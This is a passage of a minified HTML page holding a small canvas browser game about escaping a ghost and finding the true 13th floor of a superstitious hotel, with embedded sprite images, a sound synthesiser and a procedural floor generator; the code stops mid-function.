<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="shortcut icon" href="#"><script type="text/javascript">(()=>{var t={684:t=>{t.exports="data:image/png;charset=utf-8;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAAXNSR0IArs4c6QAAAA9QTFRFaWpqWVZS7+/vpqamp7a9VPGBuwAAAAV0Uk5TAP////8c0CZSAAAAGUlEQVQYlWNgIAYwwQFMgBEKBkSAiXa2AABWrwCyB71shgAAAABJRU5ErkJggg=="},15:t=>{t.exports="data:image/png;charset=utf-8;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAAXNSR0IArs4c6QAAAA9QTFRFAAAAJmtAG1Ixm623////HcLkLgAAAAV0Uk5TAP////8c0CZSAAAAI0lEQVQYlWNgIAiYUAFQgBEMYBStBJhBDGYYBRIAAxhFG2sBjcIBKTR+4a0AAAAASUVORK5CYII="},540:t=>{t.exports="data:image/png;charset=utf-8;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAAXNSR0IArs4c6QAAAA9QTFRFAAAAJmtAG1Ixm623////HcLkLgAAAAV0Uk5TAP////8c0CZSAAAAIklEQVQYlWNgIAiYUAFQgJGRiQUCQEy6CTAzwwWATNrYAgAAewIvfwSP/QAAAABJRU5ErkJggg=="},75:t=>{t.exports="data:image/png;charset=utf-8;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAAXNSR0IArs4c6QAAAA9QTFRFaWpqWVZS7+/vpqamp7a9VPGBuwAAAAV0Uk5TAP////8c0CZSAAAAH0lEQVQYlWNgBgFGEACzGBgwBRiRAQ4BsCaIziEtAAAQBwIRe9QqsgAAAABJRU5ErkJggg=="},96:t=>{t.exports="data:image/png;charset=utf-8;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAAXNSR0IArs4c6QAAAA9QTFRFaWpqWVZS7+/vpqamp7a9VPGBuwAAAAV0Uk5TAP////8c0CZSAAAAK0lEQVQYlWNgBgFGEACzGBgwBRiRAQ4BoBYWFhYQRWMBJiYmVAFmMKaWAAAQHAIIf85mbwAAAABJRU5ErkJggg=="},921:t=>{t.exports="data:image/png;charset=utf-8;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAAXNSR0IArs4c6QAAAA9QTFRFaWpqWVZS7+/vpqamp7a9VPGBuwAAAAV0Uk5TAP////8c0CZSAAAAJklEQVQYlWNgBgFGEACzGBgwBRiRAQ4BFhigqQATDMAEmGGAWgIANrYCVlaWXicAAAAASUVORK5CYII="},919:t=>{t.exports="data:image/png;charset=utf-8;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAAAXNSR0IArs4c6QAAAA9QTFRF2aBmrDIyW27hIiA02aBmlEx95gAAAAV0Uk5TAP////8c0CZSAAAAhElEQVQ4jdWSQQ6AMAgEofL/Nysr0KIYLnpwExPTGWFNSvSbbJqOw5COS2WACtizIAgxcy3Ix0IYykMYGi9+GsFHRE+Ph2HwndsEnHPwKdgyXuI8dywM65kMCsWENAmf+hSQXOOya/kNKg1nhUFzR6qblfleCtQKtAr1HY3UNzAZDX8nOyDKAsGuRURmAAAAAElFTkSuQmCC"},750:t=>{t.exports="data:image/png;charset=utf-8;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAAAXNSR0IArs4c6QAAAA9QTFRF2aBmrDIyW27hIiA02aBmlEx95gAAAAV0Uk5TAP////8c0CZSAAAAd0lEQVQ4jaXSUQ6AMAgDUCq9/5llE02MoSyuH/70STYys1c8Y0XctXBvxBIgqQAHmERNGClvQQ2sGRDRPQD5NzCF7iO/AXYB0AhGoQGpR8T9ry5WoY4Z33qZOb3e5RGpugdIsg2OBaDP2YAcXwPyBsWecsGfN30CJeYCia740UcAAAAASUVORK5CYII="},796:t=>{t.exports="data:image/png;charset=utf-8;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAAAXNSR0IArs4c6QAAAA9QTFRF2aBmrDIyW27hIiA02aBmlEx95gAAAAV0Uk5TAP////8c0CZSAAAAhklEQVQ4jZWSQQ7AIAgEAfn/m6uUWmJYaDceNDOLHiRKMiwZCbgwRmOMXlBbyDCgM5Wgd/AbXNCEMjNtIefTaDhzyek27HxKxp9rbHMY+vK1e7wgrALHnG/QPT/nFECOcfGfICLYEE/HoeEMCl6FE75wafn6CClX74OfYj2bnHM8OBglLnMBxKIC16FEXw0AAAAASUVORK5CYII="},911:t=>{t.exports="data:image/png;charset=utf-8;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAAAXNSR0IArs4c6QAAAA9QTFRF2aBmrDIyW27hIiA02aBmlEx95gAAAAV0Uk5TAP////8c0CZSAAAAcElEQVQ4jaWSQRLAIAgDQfL/N7douUHSTnN0d2LG0ex7Ykfx2YjgRnwQeiMCNwJGYwNkiICTcQQqvWCKG+fuzrifTN3FR8F/C3LC+w3kDbxeohVWJo2pYT0GiTIW7QAUh7jgCHIi41lBC9g3LKM7vQApLAKQfsg+3QAAAABJRU5ErkJggg=="}},i={};function e(s){var h=i[s];if(void 0!==h)return h.exports;var n=i[s]={exports:{}};return t[s](n,n.exports,e),n.exports}e.d=(t,i)=>{for(var s in i)e.o(i,s)&&!e.o(t,s)&&Object.defineProperty(t,s,{enumerable:!0,get:i[s]})},e.o=(t,i)=>Object.prototype.hasOwnProperty.call(t,i),e.r=t=>{"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(t,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(t,"__esModule",{value:!0})},(()=>{var t={};function i(t,i,e){return t*(1-e)+i*e}function s(t,i,e){return Math.min(Math.max(t,e),i)}function h(t,i){let e=n(t),s=n(i);return!(t.A&&e.width!=e.height||i.A&&s.width!=s.height)&&([e,s]=[e,s].map((s=>((s==e?t:i).A&&(s.A=s.width/2,s.x+=s.A,s.y+=s.A),s))),t.A&&i.A?Math.hypot(e.x-s.x,e.y-s.y)<e.A+s.A:t.A||i.A?c(t.A?e:s,t.A?i:t):e.x<s.x+s.width&&e.x+e.width>s.x&&e.y<s.y+s.height&&e.y+e.height>s.y)}function n(t){let{x:i=0,y:e=0,width:s,height:h,A:n}=t.M||t;return t.I&&(s=t.I,h=t.B),n&&(s=2*n.x,h=2*n.y),t.anchor&&(i-=s*t.anchor.x,e-=h*t.anchor.y),s<0&&(i+=s,s*=-1),h<0&&(e+=h,h*=-1),{x:i,y:e,width:s,height:h}}e.r(t),e.d(t,{i:()=>ht});let r=()=>{},A={C:!0};function a(t,i){let e=i.parentNode;t.setAttribute("data-kontra",""),e?([...e.querySelectorAll(":scope > [data-kontra]")].pop()||i).after(t):"CANVAS"==i.nodeName?document.body.append(t):i.append(t)}function o(t,i){let e=t.indexOf(i);if(-1!=e)return t.splice(e,1),!0}function c(t,i){let{x:e,y:s,width:h,height:r}=n(i);do{e-=i.sx||0,s-=i.sy||0}while(i=i.parent);let A=t.x-Math.max(e,Math.min(t.x,e+h)),a=t.y-Math.max(s,Math.min(t.y,s+r));return A*A+a*a<t.A*t.A}let l,u,d={};function f(t,i){d[t]=d[t]||[],d[t].push(i)}function g(t,...i){(d[t]||[]).map((t=>t(...i)))}let w={get:(t,i)=>"_proxy"==i||r};function p(){return l}function x(){return u}function m(t,{R:i=!1}={}){if(l=document.getElementById(t)||t||document.querySelector("canvas"),i&&(l=l||new Proxy({},w)),!l)throw Error("You must provide a canvas element for the game");return u=l.getContext("2d")||new Proxy({},w),u.imageSmoothingEnabled=!1,g("init"),{canvas:l,context:u}}class y{constructor(t=0,i=0,e={}){null!=t.x?(this.x=t.x,this.y=t.y):(this.x=t,this.y=i),e._c&&(this.S(e._a,e._b,e._d,e._e),this.x=t,this.y=i)}set(t){this.x=t.x,this.y=t.y}add(t){return new y(this.x+t.x,this.y+t.y,this)}F(t){return new y(this.x-t.x,this.y-t.y,this)}scale(t){return new y(this.x*t,this.y*t)}normalize(t=this.length()||1){return new y(this.x/t,this.y/t)}dot(t){return this.x*t.x+this.y*t.y}length(){return Math.hypot(this.x,this.y)}Y(t){return Math.hypot(this.x-t.x,this.y-t.y)}angle(t){return Math.acos(this.dot(t)/(this.length()*t.length()))}direction(){return Math.atan2(this.y,this.x)}S(t,i,e,s){this._c=!0,this._a=t,this._b=i,this._d=e,this._e=s}get x(){return this._x}get y(){return this._y}set x(t){this._x=this._c?s(this._a,this._d,t):t}set y(t){this._y=this._c?s(this._b,this._e,t):t}}function M(){return new y(...arguments)}class Q{constructor(t){return this.init(t)}init(t={}){this.position=M(),this.U=M(),this.acceleration=M(),this.ttl=1/0,Object.assign(this,t)}update(t){this.advance(t)}advance(t){let i=this.acceleration;t&&(i=i.scale(t)),this.U=this.U.add(i);let e=this.U;t&&(e=e.scale(t)),this.position=this.position.add(e),this._pc(),this.ttl--}get dx(){return this.U.x}get dy(){return this.U.y}set dx(t){this.U.x=t}set dy(t){this.U.y=t}get ddx(){return this.acceleration.x}get ddy(){return this.acceleration.y}set ddx(t){this.acceleration.x=t}set ddy(t){this.acceleration.y=t}O(){return this.ttl>0}_pc(){}}class v extends Q{init({width:t=0,height:i=0,context:e=x(),G:s=this.draw,update:h=this.advance,children:n=[],anchor:r={x:0,y:0},opacity:A=1,rotation:a=0,N:o=0,T:c=0,V:l=1,D:u=1,...d}={}){this._c=[],super.init({width:t,height:i,context:e,anchor:r,opacity:A,rotation:a,N:o,T:c,V:l,D:u,...d}),this._di=!0,this._uw(),this.W(n),this._rf=s,this._uf=h,f("init",(()=>{this.context??=x()}))}update(t){this._uf(t),this.children.map((i=>i.update&&i.update(t)))}G(){let t=this.context;t.save(),(this.x||this.y)&&t.translate(this.x,this.y),this.rotation&&t.rotate(this.rotation),1==this.V&&1==this.D||t.scale(this.V,this.D);let i=this.width,e=this.height;this.A&&(i=e=2*this.A);let s=-i*this.anchor.x,h=-e*this.anchor.y;(s||h)&&t.translate(s,h),this.context.globalAlpha=this.opacity,this._rf(),(s||h)&&t.translate(-s,-h),this.children.map((t=>t.G&&t.G())),t.restore()}draw(){}_pc(){this._uw(),this.children.map((t=>t._pc()))}get x(){return this.position.x}get y(){return this.position.y}set x(t){this.position.x=t,this._pc()}set y(t){this.position.y=t,this._pc()}get width(){return this._w}set width(t){this._w=t,this._pc()}get height(){return this._h}set height(t){this._h=t,this._pc()}_uw(){if(!this._di)return;let{_wx:t=0,_wy:i=0,_wo:e=1,_wrot:s=0,_wsx:h=1,_wsy:n=1}=this.parent||{};this._wx=this.x,this._wy=this.y,this._ww=this.width,this._wh=this.height,this.A&&(this._wrx=this.A,this._wry=this.A),this._wo=e*this.opacity,this._wsx=h*this.V,this._wsy=n*this.D,this._wx=this._wx*h,this._wy=this._wy*n,this._ww=this.width*this._wsx,this._wh=this.height*this._wsy,this.A&&(this._wrx=this.A*this._wsx,this._wry=this.A*this._wsy),this._wrot=s+this.rotation;let{x:r,y:A}=function(t,i){let e=Math.sin(i),s=Math.cos(i);return{x:t.x*s-t.y*e,y:t.x*e+t.y*s}}({x:this._wx,y:this._wy},s);this._wx=r,this._wy=A,this._wx+=t,this._wy+=i}get M(){return{x:this._wx,y:this._wy,width:this._ww,height:this._wh,A:this.A?{x:this._wrx,y:this._wry}:void 0,opacity:this._wo,rotation:this._wrot,V:this._wsx,D:this._wsy}}set children(t){this.removeChild(this._c),this.W(t)}get children(){return this._c}W(...t){t.flat().map((t=>{this.children.push(t),t.parent=this,t._pc=t._pc||r,t._pc()}))}removeChild(...t){t.flat().map((t=>{o(this.children,t)&&(t.parent=null,t._pc())}))}get A(){return this._r}set A(t){this._r=t,this._pc()}get opacity(){return this._opa}set opacity(t){this._opa=s(0,1,t),this._pc()}get rotation(){return this._rot}set rotation(t){this._rot=t,this._pc()}advance(t){super.advance(t),this.N+=this.T,this.rotation+=this.N}setScale(t,i=t){this.V=t,this.D=i}get V(){return this._scx}set V(t){this._scx=t,this._pc()}get D(){return this._scy}set D(t){this._scy=t,this._pc()}}class b extends v{init({image:t,width:i=(t?t.width:void 0),height:e=(t?t.height:void 0),...s}={}){super.init({image:t,width:i,height:e,...s})}get X(){return this._a}set X(t){let i,e;for(i in this._a={},t)this._a[i]=t[i].clone(),e=e||this._a[i];this.K=e,this.width=this.width||e.width,this.height=this.height||e.height}P(t){this.K?.stop(),this.K=this.X[t],this.K.start()}advance(t){super.advance(t),this.K?.update(t)}draw(){if(this.image&&this.context.drawImage(this.image,0,0,this.image.width,this.image.height),this.K&&this.K.G({x:0,y:0,width:this.width,height:this.height,context:this.context}),this.color){if(this.context.fillStyle=this.color,this.A)return this.context.beginPath(),this.context.arc(this.A,this.A,this.A,0,2*Math.PI),void this.context.fill();this.context.fillRect(0,0,this.width,this.height)}}}function I(){return new b(...arguments)}let B=/(\d+)(\w+)/;class C extends v{init({text:t="",textAlign:i="",lineHeight:e=1,font:s=x()?.font,...h}={}){t=""+t,super.init({text:t,textAlign:i,lineHeight:e,font:s,...h}),this.context&&this._p(),f("init",(()=>{this.font??=x().font,this._p()}))}get width(){return this._w}set width(t){this._d=!0,this._w=t,this._fw=t}get text(){return this._t}set text(t){this._d=!0,this._t=""+t}get font(){return this._f}set font(t){this._d=!0,this._f=t,this._fs=function(t){if(!t)return{_:0};let i=t.match(B),e=+i[1];return{size:e,unit:i[2],_:e}}(t)._}get lineHeight(){return this._lh}set lineHeight(t){this._d=!0,this._lh=t}G(){this._d&&this._p(),super.G()}_p(){this._s=[],this._d=!1;let t=this.context,i=[this.text];if(t.font=this.font,i=this.text.split("\n"),this._fw&&i.map((i=>{let e=i.split(" "),s=e.shift(),h=s;e.map((i=>{h+=" "+i,t.measureText(h).width>this._fw&&(this._s.push(s),h=i),s=h})),this._s.push(h)})),!this._s.length&&this.text.includes("\n")){let e=0;i.map((i=>{this._s.push(i),e=Math.max(e,t.measureText(i).width)})),this._w=this._fw||e}this._s.length||(this._s.push(this.text),this._w=this._fw||t.measureText(this.text).width),this.height=this._fs+(this._s.length-1)*this._fs*this.lineHeight,this._uw()}draw(){let t=0,i=this.textAlign,e=this.context;i=this.textAlign||("rtl"==e.canvas.dir?"right":"left"),t="right"==i?this.width:"center"==i?this.width/2|0:0,this._s.map(((s,h)=>{e.textBaseline="top",e.textAlign=i,e.fillStyle=this.color,e.font=this.font,this.H&&(e.strokeStyle=this.H,e.lineWidth=this.lineWidth??1,e.strokeText(s,t,this._fs*this.lineHeight*h)),e.fillText(s,t,this._fs*this.lineHeight*h)}))}}function R(){return new C(...arguments)}let E=new WeakMap,S={},F={},Y={0:"left",1:"middle",2:"right"};function k(t,i){return parseFloat(t.getPropertyValue(i))||0}function U(t){let i=null!=t.button?Y[t.button]:"left";F[i]=!0,V(t,"onDown")}function O(t){let i=null!=t.button?Y[t.button]:"left";F[i]=!1,V(t,"onUp")}function G(t){V(t,"onOver")}function N(t){E.get(t.target)._oo=null,F={}}function T(t,i,e){let s=function(t){let i=t._lf.length?t._lf:t._cf;for(let e=i.length-1;e>=0;e--){let s=i[e];if(s.L?s.L(t):c(t,s))return s}}(t);s&&s[i]&&s[i](e),S[i]&&S[i](e,s),"onOver"==i&&(s!=t._oo&&t._oo&&t._oo.onOut&&t._oo.onOut(e),t._oo=s)}function V(t,i){t.preventDefault();let e=t.target,s=E.get(e),{V:h,D:n,offsetX:r,offsetY:A}=function(t){let{canvas:i,_s:e}=t,s=i.getBoundingClientRect(),h="none"!=e.transform?e.transform.replace("matrix(","").split(","):[1,1,1,1],n=parseFloat(h[0]),r=parseFloat(h[3]),A=(k(e,"border-left-width")+k(e,"border-right-width"))*n,a=(k(e,"border-top-width")+k(e,"border-bottom-width"))*r,o=(k(e,"padding-left")+k(e,"padding-right"))*n,c=(k(e,"padding-top")+k(e,"padding-bottom"))*r;return{V:(s.width-A-o)/i.width,D:(s.height-a-c)/i.height,offsetX:s.left+(k(e,"border-left-width")+k(e,"padding-left"))*n,offsetY:s.top+(k(e,"border-top-width")+k(e,"padding-top"))*r}}(s);t.type.includes("touch")?(Array.from(t.touches).map((({clientX:t,clientY:i,identifier:e})=>{let a=s.touches[e];a||(a=s.touches[e]={start:{x:(t-r)/h,y:(i-A)/n}},s.touches.length++),a.changed=!1})),Array.from(t.changedTouches).map((({clientX:e,clientY:a,identifier:o})=>{let c=s.touches[o];c.changed=!0,c.x=s.x=(e-r)/h,c.y=s.y=(a-A)/n,T(s,i,t),g("touchChanged",t,s.touches),"onUp"==i&&(delete s.touches[o],s.touches.length--,s.touches.length||g("touchEnd"))}))):(s.x=(t.clientX-r)/h,s.y=(t.clientY-A)/n,T(s,i,t))}function D(...t){t.flat().map((t=>{let i=t.context?t.context.canvas:p(),e=E.get(i);if(!e)throw new ReferenceError("Pointer events not initialized for the objects canvas");t.__r||(t.__r=t.G,t.G=function(){e._cf.push(this),this.__r()},e._o.push(t))}))}function W(t){let i=t.canvas;t.clearRect(0,0,i.width,i.height)}function X(t){let i=[];return t._dn?i.push(t._dn):t.children&&t.children.map((t=>{i=i.concat(X(t))})),i}class K{constructor({id:t,name:i=t,J:e=[],context:s=x(),Z:n=!0,$:r=h,tt:A,...o}){this._o=[],Object.assign(this,{id:t,name:i,context:s,Z:n,$:r,tt:A,...o});let c=this._dn=document.createElement("section");c.tabIndex=-1,c.style="position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0,0,0,0);",c.id=t,c.setAttribute("aria-label",i);let l=this;this.camera=new class extends v{set x(t){l.sx=t-this.it,super.x=t}get x(){return super.x}set y(t){l.sy=t-this.et,super.y=t}get y(){return super.y}}({context:s,anchor:{x:.5,y:.5},G:this._rf.bind(this)}),this.add(e),this._i=()=>{this.context??=x();let t=this.context.canvas,{width:i,height:e}=t,s=i/2,h=e/2;Object.assign(this.camera,{it:s,et:h,x:s,y:h,width:i,height:e}),c.isConnected||a(c,t)},this.context&&this._i(),f("init",this._i)}set J(t){this.remove(this._o),this.add(t)}get J(){return this._o}get node(){return this._dn}add(...t){t.flat().map((t=>{this._o.push(t),t.parent=this,this._dn.append(...X(t))}))}remove(...t){t.flat().map((t=>{o(this._o,t),t.parent=null,X(t).map((t=>{a(t,this.context.canvas)}))}))}show(){this.hidden=this._dn.hidden=!1;let t=this._o.find((t=>t.focus));t?t.focus(A):this._dn.focus(A),this.st()}hide(){this.hidden=this._dn.hidden=!0,this.ht()}destroy(){var t,i;t="init",i=this._i,d[t]=(d[t]||[]).filter((t=>t!=i)),this._dn.remove(),this._o.map((t=>t.destroy&&t.destroy()))}nt(t){let{x:i,y:e}=t.M||t;this.camera.x=i,this.camera.y=e}update(t){this.hidden||this._o.map((i=>i.update&&i.update(t)))}_rf(){let{_o:t,context:i,_sx:e,_sy:s,camera:h,tt:n,Z:r,$:A}=this;i.translate(e,s);let a=t;r&&(a=a.filter((t=>A(h,t)))),n&&a.sort(n),a.map((t=>t.G&&t.G()))}G(){if(!this.hidden){let{context:t,camera:i}=this,{x:e,y:s,it:h,et:n}=i;t.save(),this._sx=h-e,this._sy=n-s,t.translate(this._sx,this._sy),i.G(),t.restore()}}st(){}ht(){}}var P=e(75),j=e(96),_=e(921),H=e(750),L=e(919),J=e(796),Z=e(911),q=e(684),z=e(15),$=e(540);const tt=async t=>{const i=new Image;return await new Promise((e=>{i.src=t,i.onload=e})),i},it=t=>{const i=document.createElement("canvas");i.width=32,i.height=32;const e=i.getContext("2d");return e.drawImage(t,0,0),e.globalCompositeOperation="source-atop",e.fillStyle="black",e.fillRect(0,0,32,32),i};function et(){this.rt=function(t){for(var i=0;i<24;i++)this[String.fromCharCode(97+i)]=t[i]||0;this.c<.01&&(this.c=.01);var e=this.b+this.c+this.e;if(e<.18){var s=.18/e;this.b*=s,this.c*=s,this.e*=s}}}var st=new function(){var t,i,e,s,h,n,r,A,a,o,c,l;this._params=new et,this.reset=function(){var t=this._params;s=100/(t.f*t.f+.001),h=100/(t.g*t.g+.001),n=1-t.h*t.h*t.h*.01,r=-t.i*t.i*t.i*1e-6,t.a||(c=.5-t.n/2,l=5e-5*-t.o),A=1+t.l*t.l*(t.l>0?-.9:10),a=0,o=1==t.m?0:(1-t.m)*(1-t.m)*2e4+32},this.At=function(){this.reset();var s=this._params;return t=s.b*s.b*1e5,i=s.c*s.c*1e5,e=s.e*s.e*1e5+12,3*((t+i+e)/3|0)},this.ot=function(u,d){var f=this._params,g=1!=f.s||f.v,w=f.v*f.v*.1,p=1+3e-4*f.w,x=f.s*f.s*f.s*.1,m=1+1e-4*f.t,y=1!=f.s,M=f.x*f.x,Q=f.g,v=f.q||f.r,b=f.r*f.r*f.r*.2,I=f.q*f.q*(f.q<0?-1020:1020),B=f.p?32+((1-f.p)*(1-f.p)*2e4|0):0,C=f.d,R=f.j/2,E=f.k*f.k*.01,S=f.a,F=t,Y=1/t,k=1/i,U=1/e,O=5/(1+f.u*f.u*20)*(.01+x);O>.8&&(O=.8),O=1-O;for(var G,N,T,V,D,W,X=!1,K=0,P=0,j=0,_=0,H=0,L=0,J=0,Z=0,q=0,z=0,$=new Array(1024),tt=new Array(32),it=$.length;it--;)$[it]=0;for(it=tt.length;it--;)tt[it]=2*Math.random()-1;for(it=0;it<d;it++){if(X)return it;if(B&&++q>=B&&(q=0,this.reset()),o&&++a>=o&&(o=0,s*=A),(s*=n+=r)>h&&(s=h,Q>0&&(X=!0)),N=s,R>0&&(z+=E,N*=1+Math.sin(z)*R),(N|=0)<8&&(N=8),S||((c+=l)<0?c=0:c>.5&&(c=.5)),++P>F)switch(P=0,++K){case 1:F=i;break;case 2:F=e}switch(K){case 0:j=P*Y;break;case 1:j=1+2*(1-P*k)*C;break;case 2:j=1-P*U;break;case 3:j=0,X=!0}v&&((T=0|(I+=b))<0?T=-T:T>1023&&(T=1023)),g&&p&&((w*=p)<1e-5?w=1e-5:w>.1&&(w=.1)),W=0;for(var et=8;et--;){if(++J>=N&&(J%=N,3==S))for(var st=tt.length;st--;)tt[st]=2*Math.random()-1;switch(S){case 0:D=J/N<c?.5:-.5;break;case 1:D=1-J/N*2;break;case 2:D=.225*(((D=1.27323954*(V=6.28318531*((V=J/N)>.5?V-1:V))+.405284735*V*V*(V<0?1:-1))<0?-1:1)*D*D-D)+D;break;case 3:D=tt[Math.abs(32*J/N|0)]}g&&(G=L,(x*=m)<0?x=0:x>.1&&(x=.1),y?(H+=(D-L)*x,H*=O):(L=D,H=0),_+=(L+=H)-G,D=_*=1-w),v&&($[Z%1024]=D,D+=$[(Z-T+1024)%1024],Z++),W+=D}W*=.125*j*M,u[it]=W>=1?32767:W<=-1?-32768:32767*W|0}return d}};function ht(t){st._params.rt(t);var i=st.At(),e=new Uint8Array(4*((i+1)/2|0)+44),s=2*st.ot(new Uint16Array(e.buffer,44),i),h=new Uint32Array(e.buffer,0,44);h[0]=1179011410,h[1]=s+36,h[2]=1163280727,h[3]=544501094,h[4]=16,h[5]=65537,h[6]=44100,h[7]=88200,h[8]=1048578,h[9]=1635017060,h[10]=s,s+=44;for(var n=0,r="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",A="data:audio/wav;base64,";n<s;n+=3){var a=e[n]<<16|e[n+1]<<8|e[n+2];A+=r[a>>18]+r[a>>12&63]+r[a>>6&63]+r[63&a]}return A}const{i:nt}=t,rt=(t,i,e)=>e.indexOf(t)===i,At=(t=13,i=14,e=2,s=4,h=8,n=11,r=22,A=14,a=3,o=5)=>{const[c,l]=((t,i,e,s)=>{const h=[],n=[];for(let e=(Math.random()*(t-i)|0)+i+s;e>0;e--)h.push(e);n.push(...h.splice(h.indexOf(13),1));for(let t=0;t<s-1;t++){let t;do{t=Math.random()*h.length|0}while(!(h[t]>e));n.push(...h.splice(t,1))}return n.sort(((t,i)=>i-t)),[h,n]})(r,A,a,o),u=[],d=c,f=l,g=13-(c.length-t+1),w=Array(t).fill(0).map(((t,e)=>({ct:e,acc:!1,lt:!1,fa:0,ut:Array(i).fill(0).map(((t,i)=>({ct:e,dt:i,ft:0==i,empty:Math.random()<.5})))})));let p=[];p.push(g),w[g].acc=!0,w[g].lt=!0;for(let t=0;t<h||p.length<n;t++)at(w,u,p,s,t>=h),p=p.filter(rt);ct(w,u);for(const t of u)t.gt=t.gt.filter(rt),t.gt.sort(((t,i)=>t-i));ut(w,u);let x=0;for(let t=w.length-1;t>=0;t--)w[t].fa=d[x],x++;return{wt:u,af:d,as:f,xt:g,yt:w}},at=(t,i,e,s,h)=>{const n=e[Math.random()*e.length|0],{ut:r}=t[n],A=r.filter((t=>t.Mt)),a=A.length>=s?A:r.filter((t=>!t.ft&&!t.Mt)),o=a[Math.random()*a.length|0];let c;do{c=Math.random()*t.length|0}while(c==n||!h&&e.includes(c));ot(t,i,Math.min(n,c),o.dt,Math.max(n,c)),t[c].acc=!0,e.push(c)},ot=(t,i,e,s,h)=>{const n={Qt:i.length,dt:s,gt:[e,h]};i.push(n);for(let i=e;i<h;i++)t[i].ut[s].vt=n.Qt;t[e].ut[s].Mt={Qt:n.Qt},t[h].ut[s].Mt={Qt:n.Qt}},ct=(t,i)=>{for(let e=0;e<t[0].ut.length;e++){const s=i.filter((t=>t.dt==e));s.sort(((t,i)=>t.Qt-i.Qt));for(const h of s){h.gt.sort(((t,i)=>t-i));for(let s=h.gt[0];s<=h.gt.at(-1);s++){const n=t[s].ut[e];if(n.Mt&&n.Mt.Qt!=h.Qt){lt(t,i,Math.min(h.Qt,n.Mt.Qt),Math.max(h.Qt,n.Mt.Qt));break}if(n.vt&&n.vt!=h.Qt){lt(t,i,Math.min(h.Qt,n.vt),Math.max(h.Qt,n.vt));break}}}}},lt=(t,i,e,s)=>{i[s].Qt=e;const{dt:h,gt:n}=i[s];n.sort(((t,i)=>t-i));for(let r=n[0];r<=n.at(-1);r++){const n=t[r].ut[h];n.Mt&&n.Mt.Qt==s&&(n.Mt.Qt=e,i[e].gt.push(r)),null!=n.vt&&(n.vt=e)}},ut=(t,i)=>{i.map(((e,s)=>{if(e.Qt!=s)return i[s]=null;e.gt.map(((i,s)=>{t[i].ut[e.dt].Mt.up=s<e.gt.length-1?e.gt[s+1]:null,t[i].ut[e.dt].Mt.bt=s>0?e.gt[s-1]:null}))}))},dt=["Oh no, i fear the 13/F so much i dream about it!","I can't escape until I find the exit at the true 13/F","But what numbers are skipped by the\nsuperstitious owner of the hotel?","And why is this ghost chasing me???"],ft=5e3;let gt=-1,wt=0;const pt=new class{constructor(){this.It={},this.volume=1,this.add("coin",5,[[1,,.087,.549,.344,.491,,,,,,.556,.686,,,,,,1,,,,,.25,44100,8]]),this.add("up",1,[[,,.196,,.15,.349,,.247,,,,,,.035,,,,,1,,,.207,,.25,44100,8]]),this.add("down",1,[[,,.196,,.15,.143,,.247,,,,,,.035,,,,,1,,,.207,,.25,44100,8]]),this.add("death",1,[[3,,.18,.02,.41,.637,,-.546,,,,,,,,,,,1,,,.215,,.25,44100,8]]),this.add("trans",1,[[3,,.2,,1,.24,,.293,-.152,,,-.713,.837,,,.076,,,1,,,,,.25,44100,8]]),this.add("step",3,[[3,,.077,,.118,.133,,-.512,,,,,,,,,,,.49,,,.942,,.25,44100,8]])}add(t,i,e){this.It[t]=[],e.map(((e,s)=>{this.It[t].push({Bt:0,Ct:[]});for(let h=0;h<i;h++){let i=new Audio;i.src=nt(e),this.It[t][s].Ct.push(i)}}))}play(t,i=this.volume){let e=this.It[t],s=e.length>1?e[Math.random()*e.length|0]:e[0],h=s.Ct[s.Bt];return s.Bt=(s.Bt+1)%s.Ct.length,h.volume=i,h.play().catch((t=>{})),h}},xt=async(t=0)=>{gt++;const e=document.createElement("canvas"),s=await(async()=>({ld1:await tt(P),ld2:await tt(j),ld3:await tt(_),pi:await tt(H),pf:await tt(L),pr1:await tt(J),pr2:await tt(Z),d:await tt(q),ed1:await tt(z),ed2:await tt($),pdi:it(await tt(H)),pdf:it(await tt(L)),Rt:it(await tt(J)),Et:it(await tt(Z))}))();let n,A,a=!1,c=Date.now()+t==0?0:4e3,l=0;do{n=At()}while(n.wt.some((t=>t?.gt.length>6)));do{A=Math.random()*n.yt.length|0}while(n.yt[A].lt||!n.yt[A].acc);mt(e,n);const u=()=>{n.yt[A].lt&&!h(F,T)?(a=!0,t=5,c=Date.now()+7e3):(setTimeout((()=>{lt()}),ft),l=n.yt[n.xt].fa,t=3,c=Date.now()+ft,pt.play("death").addEventListener("ended",(()=>pt.play("trans")),{once:!0}))},d=(i,e)=>{e.Mt&&(i>0&&null==e.Mt.up||i<0&&null==e.Mt.bt||(A=i>0?e.Mt.up:e.Mt.bt,setTimeout((()=>{rt(),nt()}),1e3),t=i>0?1:2,c=Date.now()+2e3,pt.play(i>0?"up":"down")))},w=()=>focus(),y=480,M=320,Q=240;let v=0,{canvas:b,context:B}=m("a"),C=function(){return new K(...arguments)}({id:"a",J:[],Z:!1});b.addEventListener("pointerenter",w),B.imageSmoothingEnabled=!1,function({A:t=5,canvas:i=p()}={}){let e=E.get(i);if(!e){let 